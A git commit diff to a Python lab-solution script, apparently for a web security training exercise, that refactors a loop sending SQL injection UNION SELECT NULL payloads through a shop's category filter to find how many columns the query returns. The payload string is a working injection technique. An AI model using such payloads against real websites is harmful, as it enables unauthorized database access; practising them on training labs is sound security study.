723d11883d7b3965ab248ea67b075c60e49fe375
madi <madimirzakup@gmail.com>
2025-01-12 14:51:00 +0500

    #

--- Server Side Topics/SQLi/SQL injection UNION attack, determining the number of columns returned by the query/payload.py
+++ Server Side Topics/SQLi/SQL injection UNION attack, determining the number of columns returned by the query/payload.py
@@ -23,7 +23,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def main(args):
     shop = Shop(args.url, args.no_proxy)
     nulls_list = ["NULL"]
-    while True:
+    num_columns = None
+    while len(nulls_list) < 50:
         nulls = ",".join(nulls_list)
         filter_path = f"filter?category=' UNION SELECT {nulls}-- "
         exploit_url = shop.base_url + filter_path
@@ -32,13 +33,16 @@ def main(args):
         else:
             resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
         if resp.status_code == 200:
+            num_columns = len(nulls_list)
             break
-        if len(nulls_list) > 50:
-            log.error("Could not determine number of columns, > 50.")
-            sys.exit(-1)
-        nulls_list.append("NULL")        
-    log.info(f"Number of columns is : {len(nulls_list)}")
-    shop.is_solved()
+        nulls_list.append("NULL")
+    if num_columns:        
+        log.info(f"Number of columns is : {len(nulls_list)}")
+        shop.is_solved()
+    else:
+        log.info("Could not determine number of columns.")
+        
+    
     
 if __name__ == "__main__":
     args=utils.parse_args(sys.argv)
